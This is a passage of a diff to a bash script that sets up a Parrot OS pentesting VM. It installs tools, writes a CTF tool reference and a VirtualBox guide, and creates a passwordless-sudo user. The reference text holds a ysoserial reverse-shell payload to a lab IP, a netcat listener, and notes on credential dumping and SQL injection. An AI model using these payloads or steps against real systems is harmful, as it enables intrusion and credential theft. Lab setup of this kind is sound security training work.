+  Location: ~/winpeas.exe (symlink to ~/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe)
+  Transfer to target and run: winpeas.exe
 
 Windows-Exploit-Suggester
-  Finds missing patches on Windows systems
-  Location: ~/tools/repos/Windows-Exploit-Suggester/
-  Usage: python windows-exploit-suggester.py --update
-         python windows-exploit-suggester.py --database <db> --systeminfo <file>
+  Finds missing patches on Windows systems
+  Location: ~/tools/repos/Windows-Exploit-Suggester/
+  Usage: python windows-exploit-suggester.py --update
+         python windows-exploit-suggester.py --database <db> --systeminfo <file>
 
 ═══════════════════════════════════════════════════════════════════════════
 REPOSITORIES & RESOURCES
 ═══════════════════════════════════════════════════════════════════════════
 
 PayloadsAllTheThings/
-  Swiss Army knife for pentesting
-  Browse locally: ~/tools/repos/PayloadsAllTheThings/
+  Swiss Army knife for pentesting
+  Browse locally: ~/tools/repos/PayloadsAllTheThings/
 
 PowerSploit/
-  PowerShell post-exploitation framework
-  Location: ~/tools/repos/PowerSploit/
+  PowerShell post-exploitation framework
+  Location: ~/tools/repos/PowerSploit/
 
 HackTricks/
-  Carlos Polop's methodology and technique documentation
-  Browse locally or at: https://book.hacktricks.xyz
-
-AutoRecon/
-  Automated reconnaissance tool by Tib3rius
-  Usage: python3 ~/tools/repos/AutoRecon/src/autorecon.py <target>
-
-Impacket-Examples/
-  Latest Impacket examples and tools from source
-  Location: ~/tools/repos/impacket/examples/
+  Carlos Polop's methodology and technique documentation
+  Browse locally or at: https://book.hacktricks.xyz
 
 GTFOBins/
-  Unix binaries that can be used for privilege escalation
-  Browse: ~/tools/repos/GTFOBins/_gtfobins/ directory
+  Unix binaries that can be used for privilege escalation
+  Browse: ~/tools/repos/GTFOBins/_gtfobins/ directory
 
 LOLBAS/
-  Living Off The Land Binaries and Scripts for Windows
-  Browse: ~/tools/repos/LOLBAS/yml/ directory for techniques
-
-nuclei-templates/
-  Official Nuclei vulnerability templates (auto-updated)
-  Used automatically by nuclei command
+  Living Off The Land Binaries and Scripts for Windows
+  Browse: ~/tools/repos/LOLBAS/yml/ directory for techniques
 
 ═══════════════════════════════════════════════════════════════════════════
 WORDLISTS
 ═══════════════════════════════════════════════════════════════════════════
 
 SecLists/
-  Comprehensive collection of security wordlists
-  Location: ~/SecLists (symlink to ~/tools/wordlists/SecLists/)
-  Popular lists:
-    - Passwords: SecLists/Passwords/
-    - Web Content: SecLists/Discovery/Web-Content/
-    - Usernames: SecLists/Usernames/
-    - Fuzzing: SecLists/Fuzzing/
+  Comprehensive collection of security wordlists
+  Location: ~/SecLists (symlink to ~/tools/wordlists/SecLists/)
+  Popular lists: Passwords, Web Content, Usernames, Fuzzing
 
 rockyou.txt
-  Classic password list (14M+ passwords)
-  Location: ~/tools/wordlists/rockyou.txt (symlink to /usr/share/wordlists/rockyou.txt)
+  Classic password list (14M+ passwords)
+  Location: ~/tools/wordlists/rockyou.txt (symlink to /usr/share/wordlists/rockyou.txt)
 
 ═══════════════════════════════════════════════════════════════════════════
 MODERN WORKFLOW TIPS
 ═══════════════════════════════════════════════════════════════════════════
 
 Initial Recon Chain:
-  subfinder -d target.com -silent | dnsx -a -silent | httpx -tech-detect -silent | nuclei -severity critical,high
+  subfinder -d target.com -silent | dnsx -a -silent | httpx -tech-detect -silent | nuclei -severity critical,high
 
-Port Scanning:
-  naabu -host target.com -p - -silent | nmap -sV -iL -
-
-Web Enumeration:
-  httpx + katana + ffuf + nuclei combo is fastest
-
-AD Enumeration:
-  netexec for everything, then bloodhound for visualization
-
-Pivoting Preference:
-  1. ligolo-ng (if it compiled)
-  2. chisel (reliable, fast)
-  3. sshuttle (works everywhere, no hassle)
-
-Password Attacks:
-  netexec for spraying, then dump with secretsdump/lsassy
-  Crack hashes: hashcat -m <mode> hashes.txt rockyou.txt
-
-SQL Injection:
-  1. Detect: sqlmap -u <url> --batch
-  2. Enumerate: sqlmap -u <url> --dbs
-  3. Dump: sqlmap -u <url> -D <db> -T <table> --dump
-
-Java Deserialization:
-  1. Identify: Look for serialized objects (rO0AB, aced0005)
-  2. Payload: ysoserial CommonsCollections6 "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
-  3. Deliver: Replace serialized object with malicious payload
+Reverse Shell Listener:
+  rlwrap nc -lvnp 4444
 
 Git Repository Disclosure:
-  1. Find: GitTools/Finder or manual discovery
-  2. Dump: git-dumper or GitTools/Dumper
-  3. Extract: GitTools/Extractor (recovers all commits)
-  4. Scan secrets: trufflehog + gitleaks on extracted repo
-  5. Review: Check docker-compose.yml, .env files, config files
+  1. Dump: git-dumper or GitTools/Dumper
+  2. Extract: GitTools/Extractor (recovers all commits)
+  3. Scan secrets: trufflehog + gitleaks on extracted repo
+
+Java Deserialization:
+  1. Payload: ysoserial CommonsCollections6 "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
 
 ═══════════════════════════════════════════════════════════════════════════
 TIPS & TRICKS
 ═══════════════════════════════════════════════════════════════════════════
 
-• All Impacket tools work WITHOUT the 'impacket-' prefix
+• All Impacket tools now work WITHOUT the '.py' suffix! (e.g., 'secretsdump')
 • Use 'nxc' as shorthand for 'netexec'
-• Docker commands don't require sudo (jamie is in docker group)
 • Tmux prefix is Ctrl-a (split with | and -)
 • Alt+arrows to switch tmux panes without prefix
-• Tab completion works for most commands and arguments
-• Up arrow searches command history based on what you've typed
-• Use 'extract' function for any compressed file
-• Nuclei templates auto-update, or run: nuclei -update-templates
-• ProjectDiscovery tools have built-in JSON output: add -j flag
+• Use **'extract'** function for any compressed file (including 7z)
+• Use **'rl'** for a reliable netcat listener with history (rlwrap nc)
 
 ═══════════════════════════════════════════════════════════════════════════
 ENGAGEMENT WORKFLOW
@@ -1129,48 +1055,49 @@ ENGAGEMENT WORKFLOW
 1. newengagement <target-name>
 2. cd ~/engagements/<target-name>
 3. Initial recon:
-   - subfinder -d target.com -silent | tee recon/subdomains.txt
-   - naabu -l recon/subdomains.txt -silent | tee recon/ports.txt
+   - subfinder -d target.com -silent | tee recon/subdomains.txt
+   - naabu -l recon/subdomains.txt -silent | tee recon/ports.txt
 4. Web enumeration:
-   - httpx -l recon/subdomains.txt -tech-detect | tee recon/web.txt
-   - nuclei -l recon/web.txt -severity critical,high
+   - httpx -l recon/subdomains.txt -tech-detect | tee recon/web.txt
+   - nuclei -l recon/web.txt -severity critical,high
 5. Document findings in notes/
 6. Store loot in loot/
 7. Keep all output files in recon/scans/ for reference
 
 ═══════════════════════════════════════════════════════════════════════════
 
-Tool Stack Version: 2.0 (Modern 2025 Edition)
+Tool Stack Version: 2.1 (Impacket/Compression Fix Edition)
 Last updated: ${CREATION_DATE}
 
 TOOLS_EOF
 
-    # Create VirtualBox Guest Additions installation guide
-    log_info "Creating VirtualBox Guest Additions installation guide"
-    cat > $USER_HOME/Desktop/VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt << 'VBOX_EOF'
+    # Create VirtualBox Guest Additions installation guide
+    log_info "Creating VirtualBox Guest Additions installation guide"
+    # (Content of VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt remains the same)
+    cat > $USER_HOME/Desktop/VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt << 'VBOX_EOF'
 ╔═══════════════════════════════════════════════════════════════════════════╗
-║          Installing VirtualBox Guest Additions on Parrot OS               ║
-║                    (Debian 12 "Bookworm"-based)                           ║
+║          Installing VirtualBox Guest Additions on Parrot OS               ║
+║                    (Debian 12 "Bookworm"-based)                           ║
 ╚═══════════════════════════════════════════════════════════════════════════╝
 
 This guide will help you install VirtualBox Guest Additions to enable:
-  • Shared clipboard (copy/paste between host and VM)
-  • Drag and drop files
-  • Shared folders
-  • Better screen resolution and scaling
-  • Improved mouse integration
+  • Shared clipboard (copy/paste between host and VM)
+  • Drag and drop files
+  • Shared folders
+  • Better screen resolution and scaling
+  • Improved mouse integration
 
 ═══════════════════════════════════════════════════════════════════════════
 STEP 1: Insert the Guest Additions ISO
 ═══════════════════════════════════════════════════════════════════════════
 
 On your Windows host:
-  1. Open VirtualBox Manager
-  2. Select your Parrot VM → Settings → Storage
-  3. Under the CD drive (IDE or SATA), click the disc icon
-  4. Choose "Insert Guest Additions CD image..."
-     OR manually select:
-     C:\Program Files\Oracle\VirtualBox\VBoxGuestAdditions.iso
+  1. Open VirtualBox Manager
+  2. Select your Parrot VM → Settings → Storage
+  3. Under the CD drive (IDE or SATA), click the disc icon
+  4. Choose "Insert Guest Additions CD image..."
+     OR manually select:
+     C:\Program Files\Oracle\VirtualBox\VBoxGuestAdditions.iso
 
 ═══════════════════════════════════════════════════════════════════════════
 STEP 2: Mount the ISO in the Parrot guest
@@ -1182,9 +1109,9 @@ sudo mkdir -p /mnt/cdrom
 sudo mount /dev/cdrom /mnt/cdrom
 
 Expected output:
-  mount: /mnt/cdrom: WARNING: source write-protected, mounted read-only.
+  mount: /mnt/cdrom: WARNING: source write-protected, mounted read-only.
 
-⚠️  This warning is NORMAL and OK to ignore — CD-ROMs are read-only by nature.
+⚠️  This warning is NORMAL and OK to ignore — CD-ROMs are read-only by nature.
 
 ═══════════════════════════════════════════════════════════════════════════
 STEP 3: Verify the ISO contents
@@ -1193,10 +1120,10 @@ STEP 3: Verify the ISO contents
 ls /mnt/cdrom
 
 You should see files like:
-  • VBoxLinuxAdditions.run
-  • VBoxWindowsAdditions.exe
-  • autorun.sh
-  • AUTORUN.INF
+  • VBoxLinuxAdditions.run
+  • VBoxWindowsAdditions.exe
+  • autorun.sh
+  • AUTORUN.INF
 
 ═══════════════════════════════════════════════════════════════════════════
 STEP 4: Install required build tools
@@ -1206,9 +1133,9 @@ sudo apt update
 sudo apt install -y build-essential dkms linux-headers-$(uname -r)
 
 This installs:
-  • build-essential: Compilers and build tools
-  • dkms: Dynamic Kernel Module Support
-  • linux-headers: Kernel headers for your current kernel
+  • build-essential: Compilers and build tools
+  • dkms: Dynamic Kernel Module Support
+  • linux-headers: Kernel headers for your current kernel
 
 ═══════════════════════════════════════════════════════════════════════════
 STEP 5: Run the Guest Additions installer
@@ -1218,23 +1145,23 @@ cd /mnt/cdrom
 sudo sh ./VBoxLinuxAdditions.run
 
 Expected output:
-  Verifying archive integrity...  100%   MD5 checksums are OK. All good.
-  Uncompressing VirtualBox X.X.X Guest Additions for Linux...
-  VirtualBox Guest Additions: Starting.
-  VirtualBox Guest Additions: Building the VirtualBox Guest Additions kernel
-  modules.  This may take a while.
-  VirtualBox Guest Additions: To build modules for other installed kernels, run
-  VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup <version>
-  VirtualBox Guest Additions: or
-  VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup all
-  VirtualBox Guest Additions: Building the modules for kernel X.X.X-X-amd64.
-  VirtualBox Guest Additions: Running kernel modules will not be replaced until
-  the system is restarted
-  VirtualBox Guest Additions: kernel modules and services X.X.X loaded
+  Verifying archive integrity...  100%   MD5 checksums are OK. All good.
+  Uncompressing VirtualBox X.X.X Guest Additions for Linux...
+  VirtualBox Guest Additions: Starting.
+  VirtualBox Guest Additions: Building the VirtualBox Guest Additions kernel
+  modules.  This may take a while.
+  VirtualBox Guest Additions: To build modules for other installed kernels, run
+  VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup <version>
+  VirtualBox Guest Additions: or
+  VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup all
+  VirtualBox Guest Additions: Building the modules for kernel X.X.X-X-amd64.
+  VirtualBox Guest Additions: Running kernel modules will not be replaced until
+  the system is restarted
+  VirtualBox Guest Additions: kernel modules and services X.X.X loaded
 
-⚠️  You may see repeated errors like:
-  libkmod: ERROR ../libkmod/libkmod-config.c:772 conf_files_filter_out: 
-  Directories inside directories are not supported: /etc/modprobe.d/virtualbox-dkms.conf
+⚠️  You may see repeated errors like:
+  libkmod: ERROR ../libkmod/libkmod-config.c:772 conf_files_filter_out: 
+  Directories inside directories are not supported: /etc/modprobe.d/virtualbox-dkms.conf
 
 These errors are OK to ignore unless they interfere with system behavior.
 They occur when there's a directory where a config file is expected.
@@ -1246,106 +1173,106 @@ STEP 6: Reboot the VM
 sudo reboot
 
 After reboot, Guest Additions should be active and you'll have:
-  ✓ Shared clipboard
-  ✓ Drag and drop
-  ✓ Better resolution scaling
-  ✓ Seamless mouse integration
+  ✓ Shared clipboard
+  ✓ Drag and drop
+  ✓ Better resolution scaling
+  ✓ Seamless mouse integration
 
 ═══════════════════════════════════════════════════════════════════════════
 TROUBLESHOOTING
 ═══════════════════════════════════════════════════════════════════════════
 
 If clipboard sharing doesn't work after reboot:
-  1. Verify Guest Additions are running:
-     lsmod | grep vbox
+  1. Verify Guest Additions are running:
+     lsmod | grep vbox
 
-     You should see modules like:
-       vboxguest
-       vboxsf
-       vboxvideo
+     You should see modules like:
+       vboxguest
+       vboxsf
+       vboxvideo
 
-  2. Check VirtualBox settings:
-     VM Settings → General → Advanced
-     - Shared Clipboard: Bidirectional
-     - Drag'n'Drop: Bidirectional
+  2. Check VirtualBox settings:
+     VM Settings → General → Advanced
+     - Shared Clipboard: Bidirectional
+     - Drag'n'Drop: Bidirectional
 
-  3. Restart the VBoxClient services:
-     killall VBoxClient
-     VBoxClient --clipboard &
-     VBoxClient --draganddrop &
-     VBoxClient --seamless &
+  3. Restart the VBoxClient services:
+     killall VBoxClient
+     VBoxClient --clipboard &
+     VBoxClient --draganddrop &
+     VBoxClient --seamless &
 
 If kernel modules fail to build:
-  • Ensure you have the correct kernel headers:
-    sudo apt install linux-headers-$(uname -r)
-  
-  • Try rebuilding:
-    sudo /sbin/rcvboxadd setup
+  • Ensure you have the correct kernel headers:
+    sudo apt install linux-headers-$(uname -r)
+  
+  • Try rebuilding:
+    sudo /sbin/rcvboxadd setup
 
 If screen resolution is wrong:
-  • Right-click desktop → Display Settings
-  • Or use VirtualBox: View → Auto-resize Guest Display
+  • Right-click desktop → Display Settings
+  • Or use VirtualBox: View → Auto-resize Guest Display
 
 ═══════════════════════════════════════════════════════════════════════════
 SETTING UP SHARED FOLDERS (Optional)
 ═══════════════════════════════════════════════════════════════════════════
 
 1. On Windows host:
-   VM Settings → Shared Folders → Add new shared folder
-   Folder Path: C:\Users\YourName\Desktop (or wherever)
-   Folder Name: shared (or any name you want)
-   ☑ Auto-mount
-   ☑ Make Permanent
+   VM Settings → Shared Folders → Add new shared folder
+   Folder Path: C:\Users\YourName\Desktop (or wherever)
+   Folder Name: shared (or any name you want)
+   ☑ Auto-mount
+   ☑ Make Permanent
 
 2. In Parrot VM, add your user to vboxsf group:
-   sudo usermod -aG vboxsf jamie
-   
+   sudo usermod -aG vboxsf jamie
+   
 3. Reboot or log out/in
 
 4. Access shared folder at:
-   /media/sf_shared (or whatever name you chose)
+   /media/sf_shared (or whatever name you chose)
 
 ═══════════════════════════════════════════════════════════════════════════
 QUICK REFERENCE COMMANDS
 ═══════════════════════════════════════════════════════════════════════════
 
 Mount CD:
-  sudo mount /dev/cdrom /mnt/cdrom
+  sudo mount /dev/cdrom /mnt/cdrom
 
 Install:
-  cd /mnt/cdrom && sudo sh ./VBoxLinuxAdditions.run
+  cd /mnt/cdrom && sudo sh ./VBoxLinuxAdditions.run
 
 Check if running:
-  lsmod | grep vbox
+  lsmod | grep vbox
 
 Restart services:
-  killall VBoxClient && VBoxClient --clipboard &
+  killall VBoxClient && VBoxClient --clipboard &
 
 Rebuild modules:
-  sudo /sbin/rcvboxadd setup
+  sudo /sbin/rcvboxadd setup
 
 ═══════════════════════════════════════════════════════════════════════════
 VBOX_EOF
 
-    # Fix ownership of all dotfiles
-    chown -R jamie:jamie $USER_HOME
-    
-    log_info "Phase 5 complete"
-    log_progress "Phase 5/8: ✓ Complete"
+    # Fix ownership of all dotfiles
+    chown -R jamie:jamie $USER_HOME
+    
+    log_info "Phase 5 complete"
+    log_progress "Phase 5/8: ✓ Complete"
 }
 
 # ============================================
 # PHASE 6: Automation & Maintenance Scripts
 # ============================================
 phase6_automation_setup() {
-    show_progress 6
-    log_progress "Phase 6/8: Automation & Maintenance Scripts..."
-    log_info "Phase 6: Setting up automation scripts"
-    
-    sudo -u jamie mkdir -p $USER_HOME/scripts
-    
-    # Tool update script
-    cat > $USER_HOME/scripts/update-tools.sh << 'EOF'
+    show_progress 6
+    log_progress "Phase 6/8: Automation & Maintenance Scripts..."
+    log_info "Phase 6: Setting up automation scripts"
+    
+    sudo -u jamie mkdir -p $USER_HOME/scripts
+    
+    # Tool update script
+    cat > $USER_HOME/scripts/update-tools.sh << 'EOF'
 #!/bin/bash
 # Update all pentesting tools
 
@@ -1357,7 +1284,7 @@ pip3 install --upgrade --break-system-packages impacket bloodhound bloodyAD mitm
 
 echo "[+] Updating system packages (sqlmap, hashcat, john, etc.)..."
 sudo apt update
-sudo apt upgrade -y sqlmap hashcat john theharvester cewl gdb
+sudo apt upgrade -y sqlmap hashcat john theharvester cewl gdb wpscan steghide zsteg binwalk foremost exiftool p7zip-full
 
 echo "[+] Updating Go tools..."
 go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
@@ -1371,6 +1298,10 @@ go install -v github.com/OJ/gobuster/v3@latest
 go install -v github.com/jpillora/chisel@latest
 go install -v github.com/gitleaks/gitleaks/v8@latest
 go install -v github.com/michenriksen/gitrob@latest
+go install -v github.com/ropnop/kerbrute@latest
+
+echo "[+] Updating Ruby tools (one_gadget)..."
+gem update one_gadget || true
 
 echo "[+] Updating Nuclei templates..."
 nuclei -update-templates
@@ -1381,10 +1312,10 @@ wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-
 echo "[+] Updating repositories..."
 cd ~/tools/repos
 for dir in */; do
-    echo "[+] Updating $dir"
-    cd "$dir"
-    git pull || true
-    cd ..
+    echo "[+] Updating $dir"
+    cd "$dir"
+    git pull || true
+    cd ..
 done
 
 echo "[+] Updating SecLists..."
@@ -1393,24 +1324,24 @@ git pull
 
 echo "[+] Updating pwndbg..."
 if [ -d ~/tools/repos/pwndbg ]; then
-    cd ~/tools/repos/pwndbg
-    git pull
-    cd -
+    cd ~/tools/repos/pwndbg
+    git pull
+    cd -
 fi
 
 echo "[+] All tools updated!"
 EOF
-    
-    chmod +x $USER_HOME/scripts/update-tools.sh
-    
-    # Quick backup script
-    cat > $USER_HOME/scripts/backup-engagement.sh << 'EOF'
+    
+    chmod +x $USER_HOME/scripts/update-tools.sh
+    
+    # Quick backup script
+    cat > $USER_HOME/scripts/backup-engagement.sh << 'EOF'
 #!/bin/bash
 # Backup engagement folder
 
 if [ -z "$1" ]; then
-    echo "Usage: backup-engagement.sh <engagement-name>"
-    exit 1
+    echo "Usage: backup-engagement.sh <engagement-name>"
+    exit 1
 fi
 
 BACKUP_DIR=~/backups
@@ -1421,128 +1352,128 @@ tar -czf $BACKUP_DIR/$1_$TIMESTAMP.tar.gz ~/engagements/$1/
 
 echo "[+] Backup created: $BACKUP_DIR/$1_$TIMESTAMP.tar.gz"
 EOF
-    
-    chmod +x $USER_HOME/scripts/backup-engagement.sh
-    chown -R jamie:jamie $USER_HOME/scripts
-    
-    log_info "Phase 6 complete"
-    log_progress "Phase 6/8: ✓ Complete"
+    
+    chmod +x $USER_HOME/scripts/backup-engagement.sh
+    chown -R jamie:jamie $USER_HOME/scripts
+    
+    log_info "Phase 6 complete"
+    log_progress "Phase 6/8: ✓ Complete"
 }
 
 # ============================================
 # PHASE 7: Firefox Extensions for Web Enumeration
 # ============================================
 phase7_firefox_extensions() {
-    show_progress 7
-    log_progress "Phase 7/8: Firefox Extensions for CTF/Web Enumeration..."
-    log_info "Phase 7: Installing Firefox extensions"
-    
-    # Find Firefox profile directory for jamie
-    FIREFOX_PROFILE=$(find $USER_HOME/.mozilla/firefox -maxdepth 1 -type d -name "*.default*" 2>/dev/null | head -n 1)
-    
-    if [ -z "$FIREFOX_PROFILE" ]; then
-        log_warn "Firefox profile not found. Starting Firefox once to create profile..."
-        # Start Firefox as jamie briefly to create profile
-        sudo -u jamie timeout 5 firefox --headless 2>/dev/null || true
-        sleep 2
-        FIREFOX_PROFILE=$(find $USER_HOME/.mozilla/firefox -maxdepth 1 -type d -name "*.default*" 2>/dev/null | head -n 1)
-    fi
-    
-    if [ -n "$FIREFOX_PROFILE" ]; then
-        log_info "Firefox profile found: $FIREFOX_PROFILE"
-        
-        # Create extensions directory
-        sudo -u jamie mkdir -p "$FIREFOX_PROFILE/extensions"
-        
-        # Download and install extensions
-        log_progress "Installing FoxyProxy Standard (proxy management)..."
-        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/foxyproxy-standard/latest.xpi" \
-            -O "$FIREFOX_PROFILE/extensions/foxyproxy@eric.h.jung.xpi" 2>/dev/null || log_warn "Failed to download FoxyProxy"
-        
-        log_progress "Installing Dark Reader (dark mode for all sites)..."
-        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/darkreader/latest.xpi" \
-            -O "$FIREFOX_PROFILE/extensions/addon@darkreader.org.xpi" 2>/dev/null || log_warn "Failed to download Dark Reader"
-        
-        log_progress "Installing Cookie-Editor (cookie management)..."
-        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/cookie-editor/latest.xpi" \
-            -O "$FIREFOX_PROFILE/extensions/{c5f15d22-8421-4a2f-9bed-e4e2c0b560e0}.xpi" 2>/dev/null || log_warn "Failed to download Cookie-Editor"
-        
-        log_progress "Installing Wappalyzer (technology detection)..."
-        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/wappalyzer/latest.xpi" \
-            -O "$FIREFOX_PROFILE/extensions/wappalyzer@crunchlabs.com.xpi" 2>/dev/null || log_warn "Failed to download Wappalyzer"
-        
-        log_progress "Installing Hack-Tools (web pentest toolkit)..."
-        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/hacktools/latest.xpi" \
-            -O "$FIREFOX_PROFILE/extensions/{c5f15d22-8421-4a2f-9bed-hacktools}.xpi" 2>/dev/null || log_warn "Failed to download Hack-Tools"
-        
-        log_progress "Installing User-Agent Switcher (modify user agent)..."
-        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/user-agent-string-switcher/latest.xpi" \
-            -O "$FIREFOX_PROFILE/extensions/user-agent-switcher@ninetailed.ninja.xpi" 2>/dev/null || log_warn "Failed to download User-Agent Switcher"
-        
-        log_info "Firefox extensions installed. They will be available after Firefox restart."
-        log_info "Installed extensions:"
-        log_info "  - FoxyProxy Standard: Proxy management for Burp"
-        log_info "  - Dark Reader: Dark mode for web enumeration"
-        log_info "  - Cookie-Editor: Easy cookie editing"
-        log_info "  - Wappalyzer: Detect technologies on websites"
-        log_info "  - Hack-Tools: Reverse shells, payloads, etc."
-        log_info "  - User-Agent Switcher: Change browser UA"
-    else
-        log_warn "Could not find or create Firefox profile. Extensions will need to be installed manually."
-    fi
-    
-    log_info "Phase 7 complete"
-    log_progress "Phase 7/8: ✓ Complete"
+    show_progress 7
+    log_progress "Phase 7/8: Firefox Extensions for CTF/Web Enumeration..."
+    log_info "Phase 7: Installing Firefox extensions"
+    
+    # Find Firefox profile directory for jamie
+    FIREFOX_PROFILE=$(find $USER_HOME/.mozilla/firefox -maxdepth 1 -type d -name "*.default*" 2>/dev/null | head -n 1)
+    
+    if [ -z "$FIREFOX_PROFILE" ]; then
+        log_warn "Firefox profile not found. Starting Firefox once to create profile..."
+        # Start Firefox as jamie briefly to create profile
+        sudo -u jamie timeout 5 firefox --headless 2>/dev/null || true
+        sleep 2
+        FIREFOX_PROFILE=$(find $USER_HOME/.mozilla/firefox -maxdepth 1 -type d -name "*.default*" 2>/dev/null | head -n 1)
+    fi
+    
+    if [ -n "$FIREFOX_PROFILE" ]; then
+        log_info "Firefox profile found: $FIREFOX_PROFILE"
+        
+        # Create extensions directory
+        sudo -u jamie mkdir -p "$FIREFOX_PROFILE/extensions"
+        
+        # Download and install extensions
+        log_progress "Installing FoxyProxy Standard (proxy management)..."
+        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/foxyproxy-standard/latest.xpi" \
+            -O "$FIREFOX_PROFILE/extensions/foxyproxy@eric.h.jung.xpi" 2>/dev/null || log_warn "Failed to download FoxyProxy"
+        
+        log_progress "Installing Dark Reader (dark mode for all sites)..."
+        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/darkreader/latest.xpi" \
+            -O "$FIREFOX_PROFILE/extensions/addon@darkreader.org.xpi" 2>/dev/null || log_warn "Failed to download Dark Reader"
+        
+        log_progress "Installing Cookie-Editor (cookie management)..."
+        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/cookie-editor/latest.xpi" \
+            -O "$FIREFOX_PROFILE/extensions/{c5f15d22-8421-4a2f-9bed-e4e2c0b560e0}.xpi" 2>/dev/null || log_warn "Failed to download Cookie-Editor"
+        
+        log_progress "Installing Wappalyzer (technology detection)..."
+        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/wappalyzer/latest.xpi" \
+            -O "$FIREFOX_PROFILE/extensions/wappalyzer@crunchlabs.com.xpi" 2>/dev/null || log_warn "Failed to download Wappalyzer"
+        
+        log_progress "Installing Hack-Tools (web pentest toolkit)..."
+        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/hacktools/latest.xpi" \
+            -O "$FIREFOX_PROFILE/extensions/{c5f15d22-8421-4a2f-9bed-hacktools}.xpi" 2>/dev/null || log_warn "Failed to download Hack-Tools"
+        
+        log_progress "Installing User-Agent Switcher (modify user agent)..."
+        sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/user-agent-string-switcher/latest.xpi" \
+            -O "$FIREFOX_PROFILE/extensions/user-agent-switcher@ninetailed.ninja.xpi" 2>/dev/null || log_warn "Failed to download User-Agent Switcher"
+        
+        log_info "Firefox extensions installed. They will be available after Firefox restart."
+        log_info "Installed extensions:"
+        log_info "  - FoxyProxy Standard: Proxy management for Burp"
+        log_info "  - Dark Reader: Dark mode for web enumeration"
+        log_info "  - Cookie-Editor: Easy cookie editing"
+        log_info "  - Wappalyzer: Detect technologies on websites"
+        log_info "  - Hack-Tools: Reverse shells, payloads, etc."
+        log_info "  - User-Agent Switcher: Change browser UA"
+    else
+        log_warn "Could not find or create Firefox profile. Extensions will need to be installed manually."
+    fi
+    
+    log_info "Phase 7 complete"
+    log_progress "Phase 7/8: ✓ Complete"
 }
 
 # ============================================
 # PHASE 8: Post-Install Cleanup
 # ============================================
 phase8_cleanup() {
-    show_progress 8
-    log_progress "Phase 8/8: Post-Install Cleanup..."
-    log_info "Phase 8: Cleaning up and finalizing"
-    
-    # Clean apt cache
-    log_progress "Removing unnecessary packages..."
-    DEBIAN_FRONTEND=noninteractive apt autoremove -y
-    
-    log_progress "Cleaning package cache..."
-    DEBIAN_FRONTEND=noninteractive apt autoclean -y
-    
-    log_info "Phase 8 complete"
-    log_progress "Phase 8/8: ✓ Complete"
+    show_progress 8
+    log_progress "Phase 8/8: Post-Install Cleanup..."
+    log_info "Phase 8: Cleaning up and finalizing"
+    
+    # Clean apt cache
+    log_progress "Removing unnecessary packages..."
+    DEBIAN_FRONTEND=noninteractive apt autoremove -y
+    
+    log_progress "Cleaning package cache..."
+    DEBIAN_FRONTEND=noninteractive apt autoclean -y
+    
+    log_info "Phase 8 complete"
+    log_progress "Phase 8/8: ✓ Complete"
 }
 
 # ============================================
 # Main Execution
 # ============================================
 main() {
-    cat << "EOF"
+    cat << "EOF"
 ╔═══════════════════════════════════════════════════╗
-║   Parrot Security VM Enhancement Script           ║
-║   Fresh install → Fully loaded pentesting box    ║
-║   Modern 2025 Edition                             ║
+║   Parrot Security VM Enhancement Script           ║
+║   Fresh install → Fully loaded pentesting box    ║
+║   Modern 2025 Edition (Fixed)                     ║
 ╚═══════════════════════════════════════════════════╝
 EOF
-    
-    log_info "Starting installation..."
-    log_info "This will take 10-20 minutes depending on your connection"
-    sleep 2
-    
-    phase1_system_setup
-    phase2_user_setup
-    phase3_shell_setup
-    phase4_tools_setup
-    phase5_dotfiles_setup
-    phase6_automation_setup
-    phase7_firefox_extensions
-    phase8_cleanup
-    
-    cat << EOF
+    
+    log_info "Starting installation..."
+    log_info "This will take 10-20 minutes depending on your connection"
+    sleep 2
+    
+    phase1_system_setup
+    phase2_user_setup
+    phase3_shell_setup
+    phase4_tools_setup
+    phase5_dotfiles_setup
+    phase6_automation_setup
+    phase7_firefox_extensions
+    phase8_cleanup
+    
+    cat << EOF
 
 ╔═══════════════════════════════════════════════════╗
-║              Installation Complete!               ║
+║              Installation Complete!               ║
 ╚═══════════════════════════════════════════════════╝
 
 User 'jamie' created with full sudo privileges (no password required)
@@ -1555,22 +1486,23 @@ Next steps:
 5. Create an engagement: newengagement <name>
 
 Useful commands:
-  - newengagement <name>  : Create new engagement folder
-  - quickscan <target>    : Quick nmap scan
-  - serve                 : Start HTTP server on port 8000
-  - update-tools.sh       : Update all tools
-  - reconchain <domain>   : Quick recon with ProjectDiscovery tools
-  - gitanalyze <url>      : Complete Git repository analysis
+  - newengagement <name>  : Create new engagement folder
+  - quickscan <target>    : Quick nmap scan
+  - serve                 : Start HTTP server on port 8000
+  - update-tools.sh       : Update all tools
+  - reconchain <domain>   : Quick recon with ProjectDiscovery tools
+  - gitanalyze <url>      : Complete Git repository analysis
+  - extract <file>        : Universal archive extraction (Fixed!)
 
 Tool reference guide on Desktop: CTF_TOOLS_REFERENCE.txt
 VirtualBox setup guide on Desktop: VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt
 
 Happy hacking!
 EOF
-    
-    log_warn "System will reboot in 10 seconds..."
-    sleep 10
-    reboot
+    
+    log_warn "System will reboot in 10 seconds (Hit Ctrl+C to cancel)..."
+    sleep 10
+    reboot
 }
 
